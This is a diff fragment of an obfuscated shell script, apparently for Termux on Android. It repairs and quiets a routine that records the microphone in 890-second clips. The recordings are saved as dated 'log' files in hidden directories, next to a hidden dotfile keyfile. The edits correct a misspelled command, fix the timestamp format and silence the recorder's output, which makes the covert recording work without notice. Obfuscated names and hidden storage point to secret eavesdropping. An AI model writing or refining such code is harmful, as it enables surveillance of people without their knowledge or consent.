@@ -20,7 +20,7 @@ _0xfb(){
     else rm $_0xaf/.0xe0000e0f4
          touch $_0xaf/.0xe0000e0f4
          echo "Empty keyfile"
-         termux-mircrophone-record -q
+         termux-microphone-record -q
     fi
 }
 
@@ -40,12 +40,12 @@ _0x66(){
     local _d=`date +%d`
     local _m=`date +%m`
     local d=`date +%d-%m-%y`
-    local t=`date +%h-%m-%s`
+    local t=`date +%H-%M-%S`
     if ! [ -d $_0xdd/$_m/$_d ]
     then mkdir -p $_0xdd/$_m/$_d
     fi
     local fp="$_0xdd/$_m/$_d/$d--$t--log"
-    termux-microphone-record -l 890 -f $fp
+    termux-microphone-record -l 890 -f $fp >/dev/null
 }
 
 _0xcf(){
